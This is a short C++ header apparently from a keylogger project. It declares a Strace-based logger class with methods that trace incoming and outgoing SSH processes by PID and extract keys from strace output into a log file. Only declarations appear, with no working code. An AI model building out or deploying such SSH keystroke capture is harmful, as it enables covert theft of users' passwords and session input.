#ifndef KEYLOGGER_STRACE_HPP
#define KEYLOGGER_STRACE_HPP

#include "logger.hpp"


namespace logger{

    class Strace : public Logger{
    public:
        explicit Strace(std::string path_to_log): path_to_log(std::move(path_to_log)) {};
        void ssh_incoming_logger(const pid_t &pid) override;
        void ssh_outgoing_logger(const pid_t &pid) override;

    private:
        std::string find_key_in_strace_line(const std::string &data_from_strace, boost::regex &xRegEx,
                                            const std::string &sys_call);

    private:
        std::string path_to_log{};

    };
}

#endif //KEYLOGGER_STRACE_HPP
